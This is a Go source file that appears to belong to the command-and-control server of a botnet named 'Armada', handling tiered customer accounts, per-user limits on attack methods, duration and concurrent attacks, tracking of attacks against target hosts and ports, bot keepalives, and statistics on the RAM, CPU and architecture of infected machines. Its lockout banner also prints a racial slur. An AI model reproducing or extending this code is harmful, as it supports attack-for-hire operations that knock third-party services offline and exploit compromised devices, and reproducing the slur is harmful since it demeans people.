package main

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	mrand "math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

type level int

const (
	Owner level = iota
	Admin
	Pro
	Basic
)

func (user *User) GetLevel() level {
	switch user.Level {
	case "Owner":
		return Owner
	case "Admin":
		return Admin
	case "Pro":
		return Pro
	case "Basic":
		return Basic
	default:
		return Basic // Default level
	}
}

type User struct {
	Username    string    `json:"username,omitempty"`
	Password    string    `json:"password,omitempty"`
	Expire      time.Time `json:"expire"`
	Level       string    `json:"level"`
	Methods     []string  `json:"methods"`
	MaxTime     int       `json:"maxtime"`
	Concurrents int       `json:"concurrents"`
	MaxBots     int       `json:"maxbots"`
}

// Per-user running attack tracking
type RunningAttack struct {
	Method   string    `json:"method"`
	Target   string    `json:"target"`
	Port     string    `json:"port"`
	Duration int       `json:"duration"`
	Start    time.Time `json:"start"`
	Username string    `json:"username"`
	cancel   chan struct{}
}

var (
	runningAttacks     []RunningAttack
	runningAttacksLock sync.Mutex
)

func addUserAttack(username, method, target, port string, duration int) {
	atk := RunningAttack{
		Method:   method,
		Target:   target,
		Port:     port,
		Duration: duration,
		Start:    time.Now(),
		Username: username,
		cancel:   make(chan struct{}),
	}
	runningAttacksLock.Lock()
	runningAttacks = append(runningAttacks, atk)
	runningAttacksLock.Unlock()

	go func() {
		status := "completed"
		select {
		case <-time.After(time.Duration(duration) * time.Second):
			status = "completed"
		case <-atk.cancel:
			status = "stopped"
		}
		runningAttacksLock.Lock()
		for i, a := range runningAttacks {
			if a.Start.Equal(atk.Start) && a.Username == atk.Username && a.Target == atk.Target && a.Method == atk.Method && a.Port == atk.Port {
				runningAttacks = append(runningAttacks[:i], runningAttacks[i+1:]...)
				break
			}
		}
		runningAttacksLock.Unlock()
		recordAttackCompletion(atk, status)
	}()
}

func getUserAttackCount(username string) int {
	runningAttacksLock.Lock()
	defer runningAttacksLock.Unlock()
	count := 0
	for _, a := range runningAttacks {
		if a.Username == username {
			count++
		}
	}
	return count
}

func getUserAttacks(username string) []RunningAttack {
	runningAttacksLock.Lock()
	defer runningAttacksLock.Unlock()
	var result []RunningAttack
	for _, a := range runningAttacks {
		if a.Username == username {
			result = append(result, a)
		}
	}
	return result
}

func stopUserAttacks(username string) int {
	runningAttacksLock.Lock()
	var remaining []RunningAttack
	stopped := 0
	for _, a := range runningAttacks {
		if a.Username == username {
			close(a.cancel)
			stopped++
		} else {
			remaining = append(remaining, a)
		}
	}
	runningAttacks = remaining
	runningAttacksLock.Unlock()
	return stopped
}

func getAllRunningAttacks() []RunningAttack {
	runningAttacksLock.Lock()
	defer runningAttacksLock.Unlock()
	result := make([]RunningAttack, len(runningAttacks))
	copy(result, runningAttacks)
	return result
}

// HashPassword hashes a plaintext password using bcrypt.
// Use this when creating or updating user accounts so that
// users.json stores hashed passwords instead of plaintext.
func HashPassword(password string) (string, error) {
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return "", err
	}
	return string(hash), nil
}

func AuthUser(username string, password string) (bool, *User) {
	users := []User{}
	usersData, err := os.ReadFile(usersFile)
	if err != nil {
		return false, nil
	}
	if err := json.Unmarshal(usersData, &users); err != nil {
		logMsg("[AUTH] Failed to parse users.json: %v", err)
		return false, nil
	}
	for _, user := range users {
		if user.Username != username {
			continue
		}
		// Determine whether the stored password is a bcrypt hash or plaintext.
		// Bcrypt hashes always start with "$2a$" or "$2b$".
		stored := user.Password
		if strings.HasPrefix(stored, "$2a$") || strings.HasPrefix(stored, "$2b$") {
			// Bcrypt path
			if bcrypt.CompareHashAndPassword([]byte(stored), []byte(password)) != nil {
				continue
			}
		} else {
			// Legacy plaintext path
			if stored != password {
				continue
			}
		}
		if user.Expire.After(time.Now()) {
			return true, &user
		}
	}
	return false, nil
}

func getConsoleTitleAnsi(title string) string {
	return "\u001B]0;" + title + "\a"
}

func (c *client) setConsoleTitle(title string) {
	c.conn.Write([]byte(getConsoleTitleAnsi(title)))
}

func setTitle(conn net.Conn, title string) {
	// Send the escape sequence to set the window title
	titleSequence := fmt.Sprintf("\033]0;%s\007", title)
	conn.Write([]byte(titleSequence))
}

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err // return an error if reading fails
	}

	for i := range b {
		b[i] = letterBytes[b[i]%byte(len(letterBytes))]
	}

	return string(b), nil
}

// getLevelString converts the numeric permission level to human-readable string
// Returns: "Owner", "Admin", "Pro", "Basic", or "Unknown"
func (c *client) getLevelString() string {
	level := c.user.GetLevel()
	switch level {
	case Owner:
		return "Owner"
	case Admin:
		return "Admin"
	case Pro:
		return "Pro"
	case Basic:
		return "Basic"
	default:
		return "Unknown"
	}
}

// ============================================================================
// PERMISSION CHECKING FUNCTIONS
// Role-based access control for CNC commands. Each function checks if the
// authenticated user has sufficient privileges for specific command categories.
// Permission levels from lowest to highest: Basic < Pro < Admin < Owner
// ============================================================================

func safeSubstring(s string, start, length int) string {
	if start >= len(s) {
		return ""
	}
	end := start + length
	if end > len(s) {
		end = len(s)
	}
	return s[start:end]
}

// pingHandler sends periodic PING messages to keep bot connections alive
// Runs as a goroutine for each authenticated bot
// Sends PING every 16-40 seconds (randomized) to verify bot is still responsive

func pingHandler(conn net.Conn, botID string, stop chan struct{}) {
	for {
		// Random interval between 16-40 seconds
		delay := time.Duration(16+mrand.Intn(25)) * time.Second
		select {
		case <-time.After(delay):
			// Send PING, exit on error (connection dead)
			if _, err := conn.Write([]byte("PING\n")); err != nil {
				return
			}
		case <-stop:
			// Graceful shutdown requested
			return
		}
	}
}

// ============================================================================
// UI UPDATE FUNCTIONS
// Handle dynamic terminal title updates and statistics display.
// These run as background goroutines to keep user's terminal updated.
// ============================================================================

// updateTitle continuously updates the terminal title for connected users
// Shows live statistics: bot count, ongoing attacks, user info

func updateTitle() {
	for {
		clientsLock.RLock()
		snapshot := make([]*client, len(clients))
		copy(snapshot, clients)
		clientsLock.RUnlock()

		for _, cl := range snapshot {
			go func(c *client) {
				spinChars := []rune{'∴', '∵'} // Spinning animation characters
				spinIndex := 0

				for {
					running := getUserAttackCount(c.user.Username)
					remaining := time.Until(c.user.Expire).Round(time.Hour)
					days := int(remaining.Hours()) / 24

					botsStr := "all"
					if c.user.MaxBots > 0 {
						botsStr = fmt.Sprintf("%d", c.user.MaxBots)
					}

					title := fmt.Sprintf("    [%c]  %s | Bots: %s | Attacks: %d/%d | Max: %ds | Expires: %dd [%c]",
						spinChars[spinIndex], c.user.Username, botsStr,
						running, c.user.Concurrents, c.user.MaxTime, days, spinChars[spinIndex])
					setTitle(c.conn, title)
					spinIndex = (spinIndex + 1) % len(spinChars)
					time.Sleep(1 * time.Second)
				}
			}(cl)
		}
		time.Sleep(time.Second * 2)
	}
}

// getBotCount returns the number of authenticated bots currently connected
// Thread-safe: uses RLock for concurrent read access
// Only counts bots that have completed authentication handshake
// Used in title updates and statistics displays
func getBotCount() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	count := 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			count++
		}
	}
	return count
}

// countFilteredBots returns the number of authenticated bots matching the given filters
func countFilteredBots(archFilter string, minRAM int64, maxBots int) int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	count := 0
	for _, botConn := range botConnections {
		if !botConn.authenticated {
			continue
		}
		if archFilter != "" && botConn.arch != archFilter {
			continue
		}
		if minRAM > 0 && botConn.ram < minRAM {
			continue
		}
		count++
		if maxBots > 0 && count >= maxBots {
			break
		}
	}
	return count
}

// getTotalRAM calculates total RAM across all authenticated bots (in MB)
// Thread-safe: uses RLock for concurrent read access
// Sums up RAM values reported by each bot during registration
// Used to display aggregate botnet capacity in banner/stats
func getTotalRAM() int64 {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	var totalRAM int64 = 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			totalRAM += botConn.ram
		}
	}
	return totalRAM
}

// getTotalCPU calculates total CPU cores across all authenticated bots
// Thread-safe: uses RLock for concurrent read access
// Sums up CPU core counts reported by each bot during registration
// Used to display aggregate botnet compute capacity in banner/stats
func getTotalCPU() int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()
	var totalCPU int = 0
	for _, botConn := range botConnections {
		if botConn.authenticated {
			totalCPU += botConn.cpuCores
		}
	}
	return totalCPU
}

// formatRAM converts RAM from MB to human-readable string
// Automatically converts to GB for values >= 1024MB (1GB)
// Returns formatted string like "512MB" or "2.5GB"
// Makes large RAM values more readable in UI displays
func formatRAM(ramMB int64) string {
	if ramMB >= 1024 {
		return fmt.Sprintf("%.1fGB", float64(ramMB)/1024.0)
	}
	return fmt.Sprintf("%dMB", ramMB)
}

// getC2Uptime returns the C2 server uptime as a formatted string
// Calculates duration since c2StartTime was set in main()
// Returns human-readable format like "2d 4h 15m" or "45m 30s"
func getC2Uptime() string {
	uptime := time.Since(c2StartTime)
	days := int(uptime.Hours()) / 24
	hours := int(uptime.Hours()) % 24
	minutes := int(uptime.Minutes()) % 60
	seconds := int(uptime.Seconds()) % 60

	if days > 0 {
		return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
	} else if hours > 0 {
		return fmt.Sprintf("%dh %dm %ds", hours, minutes, seconds)
	} else if minutes > 0 {
		return fmt.Sprintf("%dm %ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

// getArchMap returns a map of architecture -> count of connected bots
// Thread-safe: uses RLock for concurrent read access
// Used to display architecture distribution in status bar
func getArchMap() map[string]int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	archMap := make(map[string]int)
	for _, botConn := range botConnections {
		if botConn.authenticated && botConn.arch != "" {
			archMap[botConn.arch]++
		}
	}
	return archMap
}

func getOriginMap() map[string]int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	originMap := make(map[string]int)
	for _, botConn := range botConnections {
		if botConn.authenticated {
			tag := botConn.origin
			if tag == "" {
				tag = "unknown"
			}
			originMap[tag]++
		}
	}
	return originMap
}

// showBanner displays the Armada ASCII art banner with live statistics

func showBanner(conn net.Conn) {
	RenderMainBanner(conn)
}

// findBotByID looks up a bot connection by ID (supports partial matching)
// Returns the first bot whose ID matches or starts with the given string
// Thread-safe with RLock for concurrent access
// Returns nil if no matching bot found
// Used to validate bot existence before sending targeted commands
func findBotByID(botID string) *BotConnection {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		// Match exact ID or prefix for partial ID targeting
		if id == botID || strings.HasPrefix(id, botID) {
			return botConn
		}
	}
	return nil
}

// LEGACY UI FUNCTIONS (NOT MAINTAINED)
// ============================================================================
// LEGACY ASCII UI FUNCTIONS (for telnet clients)
// ============================================================================

// RenderLoginBanner displays the login screen
func RenderLoginBanner(conn net.Conn) {
	conn.Write([]byte(ClearScreen))
	conn.Write([]byte(ColorReset))
	conn.Write([]byte(ClearScreen))

	conn.Write([]byte("\r\n"))
	conn.Write([]byte(ColorPurple4 + "      ___                              __" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple5 + "     /   |  _________ ___  ____ _____/ /___ _" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple6 + "    / /| | / ___/ __ `__ \\/ __ `/ __  / __ `/  " + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple7 + "   / ___ |/ /  / / / / / / /_/ / /_/ / /_/ /" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple8 + "  /_/  |_/_/  /_/ /_/ /_/\\__,_/\\__,_/\\__,_/" + ColorReset + "\r\n"))
	conn.Write([]byte("\r\n"))
}

// RenderAuthAnimation shows the loading animation during login
func RenderAuthAnimation(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	authFrames := []string{
		"     " + ColorCyan + "[" + ColorMagenta + "■" + ColorDarkGray + "□□□□□□□□□" + ColorCyan + "]" + ColorGray + " Initializing secure tunnel..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■" + ColorDarkGray + "□□□□□□□□" + ColorCyan + "]" + ColorGray + " Encrypting handshake..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■" + ColorDarkGray + "□□□□□□□" + ColorCyan + "]" + ColorGray + " Validating credentials..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■" + ColorDarkGray + "□□□□□□" + ColorCyan + "]" + ColorGray + " Checking access matrix..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■" + ColorDarkGray + "□□□□□" + ColorCyan + "]" + ColorGray + " Decrypting session key..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■" + ColorDarkGray + "□□□□" + ColorCyan + "]" + ColorGray + " Establishing neural link..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■" + ColorDarkGray + "□□□" + ColorCyan + "]" + ColorGray + " Loading user profile..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■■" + ColorDarkGray + "□□" + ColorCyan + "]" + ColorGray + " Syncing botnet status..." + ColorReset,
		"     " + ColorCyan + "[" + ColorMagenta + "■■■■■■■■■" + ColorDarkGray + "□" + ColorCyan + "]" + ColorGray + " Finalizing connection..." + ColorReset,
	
	}
	for _, frame := range authFrames {
		conn.Write([]byte(fmt.Sprintf("\r%s", frame)))
		time.Sleep(100 * time.Millisecond)
	}
	conn.Write([]byte("\r\n"))
}

// RenderAccessGranted shows success message
func RenderAccessGranted(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte(ColorCyan + "     ╔══════════════════════════════════════╗" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorCyan + "     ║  " + ColorGreen + "✓ ACCESS GRANTED" + ColorCyan + "  │  " + ColorWhite + "WELCOME" + ColorCyan + "        ║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorCyan + "     ╚══════════════════════════════════════╝" + ColorReset + "\r\n"))
	time.Sleep(800 * time.Millisecond)
}

// RenderAccessDenied shows failure message
func RenderAccessDenied(conn net.Conn) {
	conn.Write([]byte("\r\n"))
	conn.Write([]byte(ColorRed + "     ╔══════════════════════════════════════════════════════╗" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║  " + ColorWhite + "✗ ACCESS DENIED" + ColorRed + "  │  " + ColorGray + "INVALID CREDENTIALS" + ColorRed + "  │  " + ColorMagenta + "⚠" + ColorRed + "   ║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ╚══════════════════════════════════════════════════════╝" + ColorReset + "\r\n"))
	time.Sleep(1500 * time.Millisecond)
}

// RenderLockout shows the security lockout message
func RenderLockout(conn net.Conn) {
	conn.Write([]byte(ClearScreen))
	conn.Write([]byte("\r\n\r\n\r\n"))
	conn.Write([]byte(ColorRed + "     ╔══════════════════════════════════════════════════════════╗" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║  " + ColorWhite + "☠ " + ColorRed + "NIGGER ALARM!!" + ColorWhite + " ☠  " + ColorGray + "Too many failed attempts" + ColorRed + "       ║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║  " + ColorCyan + "◢◤" + ColorGray + " Your connection has been logged and flagged " + ColorCyan + "◢◤" + ColorRed + "   ║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ║" + ColorBlack + "                                                          " + ColorRed + "║" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorRed + "     ╚══════════════════════════════════════════════════════════╝" + ColorReset + "\r\n"))
	time.Sleep(2 * time.Second)
}

// RenderMainBanner shows the Armada banner
func RenderMainBanner(conn net.Conn) {
	conn.Write([]byte(ClearScreen))
	conn.Write([]byte("\r\n"))

	conn.Write([]byte(ColorPurple3 + "      ___                              __" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple4 + "     /   |  _________ ___  ____ _____/ /___ _" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple5 + "    / /| | / ___/ __ `__ \\/ __ `/ __  / __ `/  " + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple6 + "   / ___ |/ /  / / / / / / /_/ / /_/ / /_/ /" + ColorReset + "\r\n"))
	conn.Write([]byte(ColorPurple7 + "  /_/  |_/_/  /_/ /_/ /_/\\__,_/\\__,_/\\__,_/" + ColorReset + "\r\n"))

	conn.Write([]byte("\r\n"))
	conn.Write([]byte(ColorGray + "              type " + ColorWhite + "help" + ColorGray + " / " + ColorWhite + "methods" + ColorReset + "\r\n"))
	conn.Write([]byte("\r\n"))
}

// RenderInputBox draws the neon input box for login
func RenderInputBox(conn net.Conn) {
	conn.Write([]byte(ColorMagenta + "     ┌─────────────────────────────────────────────────────┐" + ColorReset + "\r\n"))
}

// RenderInputBoxClose closes the input box
func RenderInputBoxClose(conn net.Conn) {
	conn.Write([]byte(ColorReset))
	conn.Write([]byte(ColorMagenta + "     └─────────────────────────────────────────────────────┘" + ColorReset + "\r\n"))
}

// RenderUserPrompt shows the username prompt
func RenderUserPrompt(conn net.Conn) {
	conn.Write([]byte(ColorMagenta + "     │ " + ColorCyan + "⬡" + ColorWhite + " USER  " + ColorMagenta + "│" + ColorReset + " "))
}

// RenderPasswordPrompt shows the password prompt (hidden text)
func RenderPasswordPrompt(conn net.Conn) {
	conn.Write([]byte(ColorMagenta + "     │ " + ColorRed + "⬡" + ColorWhite + " PASS  " + ColorMagenta + "│" + ColorBlack + ColorBgBlack + " "))
}

// RenderAttemptCounter shows login attempt number
func RenderAttemptCounter(conn net.Conn, attempt int) {
	conn.Write([]byte(fmt.Sprintf(ColorRed+"              ⚠ "+ColorWhite+"Login attempt "+ColorCyan+"%d"+ColorWhite+" of "+ColorCyan+"3"+ColorWhite+" - "+ColorRed+"Access denied"+ColorReset+"\r\n\r\n", attempt)))
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func formatDuration(d time.Duration) string {
	d = d.Round(time.Second)
	h := d / time.Hour
	d -= h * time.Hour
	m := d / time.Minute
	d -= m * time.Minute
	s := d / time.Second
	if h > 0 {
		return fmt.Sprintf("%dh%dm", h, m)
	}
	if m > 0 {
		return fmt.Sprintf("%dm%ds", m, s)
	}
	return fmt.Sprintf("%ds", s)
}
